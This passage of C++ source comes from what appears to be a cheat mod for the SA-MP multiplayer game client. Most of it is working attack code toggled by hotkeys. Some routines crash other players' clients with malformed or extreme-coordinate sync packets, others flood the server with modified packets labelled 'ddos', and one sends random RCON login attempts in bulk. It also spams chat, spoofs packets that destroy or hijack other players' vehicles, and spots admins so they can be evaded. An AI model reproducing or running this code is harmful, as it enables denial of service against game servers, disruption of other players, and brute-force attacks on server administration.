			actor_info->hitpoints = 0.0f;
	}
	else if ( !isBadPtr_GTA_pVehicle(vehicle_info) )
	{
		actor_info = actor_info_get(ACTOR_SELF, 0);
		if ( actor_info->state == ACTOR_STATE_DRIVING && actor_info->vehicle->passengers[0] == actor_info )
		{
			if ( KEY_PRESSED(set.key_self_destruct) )
			{
				for ( vtemp = vehicle_info; vtemp != NULL; vtemp = vtemp->trailer )
				{
					if(vtemp == NULL) return;

					vtemp->hitpoints = 1.0f;
					cheat_vehicle_tires_set( vtemp, 1 );
					if ( !set.trailer_support )
						break;
				}
			}
		}
	}
}

void cheat_handle_exit_vehicle ( struct vehicle_info *vehicle_info, struct actor_info *actor_info )
{
	if (!isBadPtr_GTA_pVehicle(vehicle_info))
	{
		if (vehicle_info != cheat_state->_generic.pVehicleExit_Last)
		{
			if (!isBadPtr_GTA_pVehicle(cheat_state->_generic.pVehicleExit_Last))
			{
				cheat_state->_generic.pVehicleExit_Last->m_nVehicleFlags.bCanBeDamaged = true;
			}
			cheat_state->_generic.pVehicleExit_Last = vehicle_info;
		}
	}
	if (!isBadPtr_GTA_pPed(actor_info))
	{
		if (!isBadPtr_GTA_pVehicle(cheat_state->_generic.pVehicleExit_Last))
		{
			cheat_state->_generic.pVehicleExit_Last->m_nVehicleFlags.bCanBeDamaged = true;
			cheat_state->_generic.pVehicleExit_Last = NULL;
		}
	}
}

// sa-mp only
void cheat_handle_antiHijack ( actor_info *ainfo, vehicle_info *veh, float time_diff )
{
	if ( g_SAMP == NULL )
		return;

	traceLastFunc( "cheat_handle_antiHijack()" );

	if ( set.anti_carjacking && veh == NULL )
	{
		if ( cheat_state->_generic.got_vehicle_id )
			cheat_state->_generic.got_vehicle_id = false;
		if ( cheat_state->_generic.anti_carjackTick
		 &&	 cheat_state->_generic.anti_carjackTick < (GetTickCount() - 500)
		 &&	 cheat_state->_generic.car_jacked )
		{
			if ( cheat_state->_generic.car_jacked_last_vehicle_id == 0 )
			{
				showGameText( "~r~Unable To Unjack~w~!", 1000, 5 );
				cheat_state->_generic.anti_carjackTick = 0;
				cheat_state->_generic.car_jacked = false;
				return;
			}

			cheat_state->_generic.anti_carjackTick = 0;
			cheat_state->_generic.car_jacked = false;
			cheat_state->_generic.unrelatedToAnything = 1337;
			GTAfunc_PutActorInCar(GetVehicleByGtaId(cheat_state->_generic.car_jacked_last_vehicle_id));
			cheat_state->_generic.unrelatedToAnything = 0x1337;

			struct vehicle_info *veh = GetVehicleByGtaId( cheat_state->_generic.car_jacked_last_vehicle_id );
			//if ( veh != NULL )
			//	vect3_copy( cheat_state->_generic.car_jacked_lastPos, &veh->base.matrix[4 * 3] );
			showGameText( "~r~Car Unjacked~w~!", 1000, 5 );
			return;
		}
	}
	else if ( set.anti_carjacking )
	{
		if ( veh->passengers[0] == actor_info_get(ACTOR_SELF, 0) )
		{
			if ( !cheat_state->_generic.got_vehicle_id )
			{
				cheat_state->_generic.car_jacked_last_vehicle_id = getPlayerVehicleGTAScriptingID( ACTOR_SELF );
				if ( cheat_state->_generic.car_jacked_last_vehicle_id > 0 )
					cheat_state->_generic.got_vehicle_id = true;
			}
		}
	}
		return;
		}

void cheat_handle_carspam ( ) 
{ 
traceLastFunc( "cheat_handle_carspam()" );      
       if ( KEY_PRESSED(set.key_carspam) )      
       {      
        cheat_state->_generic.carspam ^= 1;      
       }      

       if( cheat_state->_generic.carspam == 1 )      
       {
	   //for(int a=0;a<3;a++)
	   /*struct vehicle_info *info = vehicle_info_get( VEHICLE_SELF, 0 );
	   struct actor_info    *infop = actor_info_get( ACTOR_SELF, 0 );     
		float coord[3];
		coord[0] = pPedSelf->GetPosition()->fX;
		coord[1] = pPedSelf->GetPosition()->fY;
		coord[2] = pPedSelf->GetPosition()->fZ;
		float speed[3];
		speed[0] = (float)(rand() % 10);
		speed[1] = (float)(rand() % 10);
		speed[2] = 0; 
		SendFakeOnfootSyncData ( coord, speed );*/
		   stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			onSync.fQuaternion[0] = random_float(-1, 1);
			onSync.fQuaternion[1] = random_float(-1, 1);
			onSync.fQuaternion[2] = random_float(-1, 1);
			onSync.fQuaternion[3] = random_float(-1, 1);
			onSync.iCurrentAnimationID = 0x3C5;
			onSync.fMoveSpeed[0] =  (float)(rand() % 10);
			onSync.fMoveSpeed[1] =  (float)(rand() % 10);
			onSync.iCurrentAnimationID = 0x3C5;
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));

			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	} 
	return; 
}
void cheat_handle_pulsedweapon () 
{  
     traceLastFunc( "cheat_handle_pulsedweapon()" ); 
     if ( KEY_PRESSED(set.key_pulsedweapon) ) 
     { 
      cheat_state->_generic.pulsedweapon ^= 1; 
     } 
      if( cheat_state->_generic.pulsedweapon == 1 ) 
     {
 static int p = 10, pulse_state=0; 
if (pulse_state == 0) 
{ 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = p; 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = 100 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints; 
p+= 4; 
if (p >= 100) pulse_state = 1; 
}  
else 
{ 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = p; 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = 100 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints; 
p-= 4; 
if (p< 10) pulse_state = 0; 
} 
      } 
     return; 
}
void cheat_handle_crasher () 
{ 
     traceLastFunc( "cheat_handle_crasher()" ); 
     if ( KEY_PRESSED(set.key_crasher) ) 
     { 
      cheat_state->_generic.crasher ^= 1; 
     } 
      if( cheat_state->_generic.crasher == 1 ) 
     {
       sendSCMEvent( 2, g_Players->pLocalPlayer->sCurrentVehicleID,1000+rand()%199, 0 ); 
      } 
     return; 
}

void cheat_handle_fake() 
{ 
     traceLastFunc( "cheat_handle_fake()" ); 
     if ( KEY_PRESSED(set.key_fake) ) 
     { 
      cheat_state->_generic.fake ^= 1; 
     } 
      if( cheat_state->_generic.fake == 1 ) 
     {  
	   for(int aa=0;aa<4;aa++)
       for(int a=0;a<49;a++)
				for(int b=0;b<getPlayerCount();b++)
				SendWastedNotification(a, b);
			} 
     return; 
}
float pos[3]; // создаём переменную 
void cheat_handle_skin_changer() // создаём функцию 
{ 
     traceLastFunc( "cheat_handle_skin_changer()" ); 
     if ( KEY_PRESSED(set.key_skin_changer) ) 
     { 
      cheat_state->_generic.skin_changer ^= 1; 
     } 
      if( cheat_state->_generic.skin_changer == 1 ) 
     {
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
		say(":%d:%d:%d:%d:%d:%d:%d: Driftyulex_m0d by AlexDrift :%d:%d:%d:%d:%d:%d:%d:", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
     } 
     return; 
}
void cheat_handle_respavner () 
{ 
     traceLastFunc( "cheat_handle_respavner()" ); 
     if ( KEY_PRESSED(set.key_respavner) ) 
     { 
      cheat_state->_generic.respavner ^= 1; 
     } 
      if( cheat_state->_generic.respavner == 1 ) 
     {
			stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			onSync.fPosition[2] -= 100;
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	 } 
     return; 
}	
void cheat_handle_pic () 
{ 
     traceLastFunc( "cheat_handle_pic()" ); 
     if ( KEY_PRESSED(set.key_pic) ) 
     { 
      cheat_state->_generic.pic ^= 1; 
     } 
      if( cheat_state->_generic.pic == 1 ) 
     {  
		pGame->SetTimeScale ( 30 );
	 } 
     return; 
}	
void cheat_handle_rcon () 
{ 
     traceLastFunc( "cheat_handle_rcon()" ); 
     if ( KEY_PRESSED(set.key_rcon) ) 
     { 
      cheat_state->_generic.rcon ^= 1; 
     } 
      if( cheat_state->_generic.rcon == 1 ) 
     { 
		  for (int a = 0; a<999; a++)
   rconWarnings();
   rconWarnings();
   rconWarnings();
   rconWarnings();
   rconWarnings();
   rconWarnings();
   rconWarnings();
   rconWarnings();
   rconWarnings();
			} 
     return; 
}
void cheat_handle_ddos () 
{ 
     traceLastFunc( "cheat_handle_ddos()" ); 
     if ( KEY_PRESSED(set.key_ddos) ) 
     {
      cheat_state->_generic.ddos ^= 1; 
     } 
      if( cheat_state->_generic.ddos == 1 ) 
     {  
		  for (int a = 0; a<999; a++)
        sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		sampModifiedPackets();
		 }	
     return; 
}	
void cheat_handle_pulsedisk () 
{ 
     traceLastFunc( "cheat_handle_pulsedisk()" ); 
     if ( KEY_PRESSED(set.key_pulsedisk) ) 
     { 
      cheat_state->_generic.pulsedisk ^= 1; 
     } 
      if( cheat_state->_generic.pulsedisk == 1 ) 
     {
     
       static int color_state=0;       

       if (color_state == 0)       

       {       
       vehicle_setColor0( vehicle_info_get(VEHICLE_SELF, 0), rand()%180 );       
       vehicle_setColor1( vehicle_info_get(VEHICLE_SELF, 0), rand()%180 );      
       }      
			} 
     return; 
}
void cheat_handle_qqqq () 
{ 
     traceLastFunc( "cheat_handle_qqqq()" ); 
     if ( KEY_PRESSED(set.key_qqqq) ) 
     { 
      cheat_state->_generic.qqqq ^= 1; 
     } 
      if( cheat_state->_generic.qqqq == 1 ) 
     {  
     vehicle_setPaintJob(vehicle_info_get(VEHICLE_SELF, 0), rand()%4 );
	} 
     return; 
}




void cheat_handle_jos () 
{ 
     traceLastFunc( "cheat_handle_jos()" ); 
     if ( KEY_PRESSED(set.key_jos) ) 
     { 
      cheat_state->_generic.jos ^= 1; 
     } 
      if( cheat_state->_generic.jos == 1 ) 
     {  
		 actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = 100;
	  }
     return; 
}
void cheat_handle_dri () 
{ 
     traceLastFunc( "cheat_handle_dri()" ); 
     if ( KEY_PRESSED(set.key_dri) ) 
     { 
      cheat_state->_generic.dri ^= 1; 
     } 
      if( cheat_state->_generic.dri == 1 ) 
     {  
				for(int b=0;b<getPlayerCount();b++)
				SendWastedNotification(49, b);
			} 
     return; 
}

void cheat_handle_crh () 
{ 
     traceLastFunc( "cheat_handle_crh()" ); 
     if ( KEY_PRESSED(set.key_crh) ) 
     { 
      cheat_state->_generic.crh ^= 1; 
     } 
      if( cheat_state->_generic.crh == 1 ) 
     {
    vehicle_addUpgrade(vehicle_info_get(VEHICLE_SELF, 0),  rand()%25 + 1073);
			} 
     return; 
}
void cheat_handle_lag () 
{ 
     traceLastFunc( "cheat_handle_lag()" ); 
     if ( KEY_PRESSED(set.key_lag) ) 
     { 
      cheat_state->_generic.lag ^= 1; 
     } 
      if( cheat_state->_generic.lag == 1 ) 
     {
		static DWORD time = GetTickCount();
		if (GetTickCount() - 400 > time)
		{
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL) continue;

				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

				int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
				if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID) continue;

				//float newpos[3] = { 9999999999999.9999, 9999999999999.9999, 999999999.9999 };
				float newpos[3] = { 999999.9, 1E07, 1E10 };

				SendFakeDriverSyncData(iSAMPVehicleID, newpos, vinfo->hitpoints, vinfo->speed, NULL);
				cheat_vehicle_teleport(vinfo, newpos, gta_interior_id_get());
			}

			time = GetTickCount();
		}
	  }}

void cheat_handle_lags () 
{ 
	traceLastFunc( "cheat_handle_lags()" ); 
     if ( KEY_PRESSED(set.key_lags) ) 
     { 
      cheat_state->_generic.lags ^= 1; 
     } 
      if( cheat_state->_generic.lags == 1 ) 
     {
 struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
    struct vehicle_info *info = vehicle_info_get( -1, 0 );
    if (info != NULL)
    {
    self->fCurrentRotation = -pGame->GetCamera()->GetCameraRotation();
    self->fTargetRotation = self->fCurrentRotation;
    info->base.matrix[4] = sinf(-self->fCurrentRotation);
    info->base.matrix[5] = cosf(-self->fCurrentRotation);
    if (KEY_DOWN('W')) ///W для езды вперед
    {
    info->speed[0] = sinf(-self->fCurrentRotation) * 0.8; ///0.8 скорость
    info->speed[1] = cosf(-self->fCurrentRotation) * 0.8;
    }
    if (KEY_DOWN('S'))///S для езды назад
    {
    info->speed[0] = sinf(-self->fCurrentRotation) * -0.8;
    info->speed[1] = cosf(-self->fCurrentRotation) * -0.8;
    }
    if (KEY_DOWN(0x20))//Space для взлета
    {
    info->speed[2] += 0.08;
    }
    if (KEY_DOWN(0xA2))///LCtrl для приземления
    {
    info->speed[2] -= 0.08;
    }
    if (KEY_DOWN(0xA0))//LShift для торможения
    {
    info->speed[0] = 0.0;
    info->speed[1] = 0.0;
    }
	}
}
}


void cheat_handle_cccc () 
{ 
     traceLastFunc( "cheat_handle_cccc()" ); 
     if ( KEY_PRESSED(set.key_cccc) ) 
     { 
      cheat_state->_generic.cccc ^= 1; 
     } 
      if( cheat_state->_generic.cccc == 1 ) 
     {
		  for (int a = 0; a<999; a++)
	    dialogWarnings();
		 dialogWarnings();
		 dialogWarnings();
		 dialogWarnings();
		 dialogWarnings();
		 dialogWarnings();
		 dialogWarnings();
	  }
     return; 
}
void cheat_handle_gggg () 
{
	traceLastFunc( "cheat_handle_gggg()" ); 
     if ( KEY_PRESSED(set.key_gggg) ) 
     { 
      cheat_state->_generic.gggg ^= 1; 
     } 
      if( cheat_state->_generic.gggg == 1 ) 
     {
	for ( int i = 0; i < 1; i++ ) 
{ 
if ( strlen(set.flooder[i]) == 0  ) 
continue; 
say( "%s", set.flooder[i] );
	}
	  }
	return; 
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void cheat_handle_grt () 
{ 
     traceLastFunc( "cheat_handle_grt()" ); 
     if ( KEY_PRESSED(set.key_grt) ) 
     { 
      cheat_state->_generic.grt ^= 1; 
     } 
      if( cheat_state->_generic.grt == 1 ) 
     {
	  static int once = 1;
	static int carUsed[SAMP_VEHICLE_MAX];

	
		struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;
		static int x = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		if ( KEY_DOWN(VK_LBUTTON) )
		{
			float fPos[3];
			vect3_copy( &self->base.matrix[4 * 3], fPos );

			fPos[0] += cam_matrix[4] * (6.0f + x);
			fPos[1] += cam_matrix[5] * (6.0f + x);
			fPos[2] += cam_matrix[6] * (6.0f + x);
			
			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			INCAR_SYNC_DATA vehSync;
			memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

			vehSync.VehicleID = iSAMPVehicleID;
			vehSync.vecPos[0] = fPos[0];
			vehSync.vecPos[1] = fPos[1];
			vehSync.vecPos[2] = fPos[2];
			vehSync.fCarHealth = vinfo->hitpoints;
			vehSync.vecMoveSpeed[0] = fSpeed[0];
			vehSync.vecMoveSpeed[1] = fSpeed[1];
			vehSync.vecMoveSpeed[2] = fSpeed[2];
			vehSync.wKeys = 0;
			vehSync.bytePlayerHealth = self->hitpoints;
			//vehSync.byteArmour = self->armor;

			SendFakeDriverFullSyncData(&vehSync, 0);
			cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );
			vinfo->speed[0] = fSpeed[0];
			vinfo->speed[1] = fSpeed[1];
			vinfo->speed[2] = fSpeed[2];

			x--;
			if ( x < -1 ) x = 0;

			v++;
		}

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;
	  }
	   return; 
}

void cheat_handle_ssss () 
{ 
     traceLastFunc( "cheat_handle_ssss()" ); 
     if ( KEY_PRESSED(set.key_ssss) ) 
     { 
      cheat_state->_generic.ssss ^= 1; 
     } 
      if( cheat_state->_generic.ssss == 1 ) 
     {
		 float MyPos[3] = {pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ};
if(MyPos[0] >= 10000.0 || MyPos[1] >= 10000.0 || MyPos[2] >= 10000.0 || MyPos[0] <= -10000.0 || MyPos[1] <= -10000.0 || MyPos[2] <= -10000.0 )pPedSelf->GetPosition()->fZ = 7;
  }
}
void cheat_handle_ffff () 
{ 
     traceLastFunc( "cheat_handle_ffff()" ); 
     if(  KEY_PRESSED(set.key_ffff) ) 
     { 
      cheat_state->_generic.ffff ^= 1; 
     } 
      if( cheat_state->_generic.ffff == 1 ) 
     {
		  for (int a = 0; a<999; a++)
	    dialogWarnings();
	    sampModifiedPackets();
	    rconWarnings();
		dialogWarnings();
	    sampModifiedPackets();
	    rconWarnings();
		dialogWarnings();
	    sampModifiedPackets();
	    rconWarnings();
	  }
	   return; 
}

int mmAx;

struct point {
	float x;
	float y;
};
struct line {
	point p1;
	point p2;
};
struct drawmap {
	line lines[10];
	int delay;
	int step;
	int pos;
};
drawmap map;

int getOnlinePlayers() {
	int p = 0;
	for (int i = 0; i < SAMP_PLAYER_MAX; i++) {
		if (g_Players->pRemotePlayer[i] != NULL) p++;
	}
	return p;

}

void drawGraphGui() {
	// _render->DrawBox(10, _render->getPresentationParameters()->BackBufferHeight, maxW, maxH, WHITE_ALPH);
	//render->D3DBoxBorder(10, pPresentParam.BackBufferHeight / 2, maxW, maxH, D3DCOLOR_XRGB(255, 165, 0), D3DCOLOR_XRGB(255, 125, 0));
	render->D3DBoxBorder(10, pPresentParam.BackBufferHeight / 2, 200, 100, D3DCOLOR_XRGB(0, 0, 0), D3DCOLOR_ARGB(150, 255, 255, 255));
	char maxplr[64];
	sprintf(maxplr, "Players online: %i", getOnlinePlayers());
	pD3DFontChat->Print(12, (pPresentParam.BackBufferHeight / 2) - pD3DFontChat->DrawHeight() - 2, D3DCOLOR_XRGB(255, 125, 0), maxplr);
}

int getLastIdPlayer() {
	int p = 0;
	for (int i = 0; i < SAMP_PLAYER_MAX; i++) {
		if (g_Players->iIsListed[i]) p = i;
	}
	return p;
}

inline void mapCalc() {
	int players = getOnlinePlayers();
	try {
		//смещаем все линии вправо
		for (int x = 9; x > 0; x--) {
			map.lines[x].p1 = map.lines[x - 1].p1;
			map.lines[x].p1.x += 20;
			map.lines[x].p2 = map.lines[x - 1].p2;
			map.lines[x].p2.x += 20;
		}
		//-------------------------

		//добавляем новый столбец
		map.lines[0].p1.x = 10;
		map.lines[0].p1.y = pPresentParam.BackBufferHeight / 2 + 100 - (players * 100 / mmAx);
		map.lines[0].p2 = map.lines[1].p1;
		//-----------------------
	}
	catch (std::exception e) {
		Log("[OnlineGrapher]: mapCalc exception detected: %s", e.what());
	}
}

void drawline(line ln) {
	render->D3DLine(ln.p1.x, ln.p1.y, ln.p2.x, ln.p2.y, D3DCOLOR_XRGB(30, 30, 200));
}
void drawMap() {
	for (int i = 0; i < 10; i++) {
		drawline(map.lines[i]);
	}
}

void onlinegraph() {
	if (cheat_state->_generic.asasasas131112z111111vv) {
		static int xtime = 0;
		int xtick = GetTickCount();
		if (xtime + 20000 < xtick) {
			mmAx = getLastIdPlayer();
			xtime = xtick;
		}
		static int time = 0;
		int tick = GetTickCount();
		if (time + 7000 < tick) {
			mapCalc();
			time = tick;
		}

		//_render->BeginRender();
		if (render) {
			drawGraphGui();
			drawMap();
		}
	}
}


void cheat_handle_bike_crasher()
{
	traceLastFunc( "cheat_handle_bike_crasher()" );
      if( cheat_state->_generic.bikecrasher == 1 ) 
	  {
     #define MAX_RCON_LEN 512
		char szRcon[MAX_RCON_LEN + 1] = "login ";
		static int ooo = 1;
	for ( int i = 0; i < ooo; i++)
		szRcon[i + 6] = 33 + rand()%95;

	ooo++;
	
	if ( ooo > MAX_RCON_LEN - 6 ) ooo = 1;
	 BitStream ls;
	unsigned long len = strlen(szRcon);
	ls.Write((BYTE)ID_RCON_COMMAND);
	ls.Write(MAX_RCON_LEN);
	ls.Write(szRcon, len);
	g_DrifeitClient->Send(&ls, PacketPriority(rand()%3+1), RELIABLE, 0);
	}
}

void cheat_handle_pickm()  
{  
  traceLastFunc( "cheat_handle_pickm()" );  
  if( cheat_state->_generic.pickm == 1 )  
  {
  float fValue = (float)0x7777777B; 
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3] = {0,0,0};
  float fQuaternion[4] = {0,0,0,0};
  cpos[2] = fValue;
 SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
  }}



void cheat_handle_pAAA()  
{  
  traceLastFunc( "cheat_handle_pAAA()" );  
  if( cheat_state->_generic.pAAA == 1 )  
  {
		int count = 0; // переменная, отвечающая за количество найденых админов 
	for(int i = 0; i < SAMP_PLAYER_MAX; i++) 
	{ 
		for(int x = 0; x < 150; x++) 
		{ 
			if(getPlayerName(i) == NULL || set.admin[x] == NULL) 
				break; 
			if(!strcmp(getPlayerName(i), set.admin[x])) 
			{ 
				
				char text[2000];
				sprintf(text, "Админ: %s [ID: %d]", getPlayerName(i), i);
				pD3DFont->PrintShadow(1,pPresentParam.BackBufferHeight-360+count*20,D3DCOLOR_XRGB(255, 165, 0),text);
				count++; 
			} 
		} 
	} 
	if ( count == 0 ) pD3DFont->PrintShadow(1,pPresentParam.BackBufferHeight-45,D3DCOLOR_XRGB(255, 165, 0),"Админов нету!");
	  }
    return;  
}



void cheat_handle_pAAAs()  
{  
  traceLastFunc( "cheat_handle_pAAAs()" );  
  if( cheat_state->_generic.pAAAs == 1 )  
  {
		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &vinfo->base.matrix[4 * 3], fPos );

		SendFakeDriverSyncData(iSAMPVehicleID, fPos, 0.0f, vinfo->speed, 0);
		vinfo->hitpoints = 0.0f;

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
		{
			v = 0;
			cheat_state->_generic.pickm1 = 0;
		}
	}
  }






void cheat_handle_pAAAsSA()  
{  
  traceLastFunc( "cheat_handle_pAAAs()" );  
  if( cheat_state->_generic.pAAAsSA == 1 )  
  {
		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &vinfo->base.matrix[4 * 3], fPos );

		SendFakeDriverSyncData(iSAMPVehicleID, fPos, 1000.0f, vinfo->speed, 0);
		vinfo->speed[0] = -3;
		vinfo->speed[1] = -3;
		vinfo->speed[2] = -1;

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
		{
			v = 0;
			cheat_state->_generic.pickm1 = 0;
		}
	}
  }


/*void LQ_RenderBoxUpVehTarget(int iSAMPVehicleID, DWORD dwColor) {
	vehicle_info *tar = getGTAVehicleFromSAMPVehicleID(iSAMPVehicleID);
	if (!tar) return;
	D3DXVECTOR3 cent;
	D3DXVECTOR3 worldcoord;
	worldcoord.x = tar->base.matrix[12];
	worldcoord.y = tar->base.matrix[13];
	worldcoord.z = tar->base.matrix[14] + 1.5f;
	CalcScreenCoors(&worldcoord, &cent);
	if (cent.z < 1.0f) return;
	static bool inv = true;
	if (inv) {
		render->D3DBoxBorder(cent.x - 20, cent.y - 30, 20, 30, D3DCOLOR_XRGB(255, 255, 255), dwColor);

	}
	else {
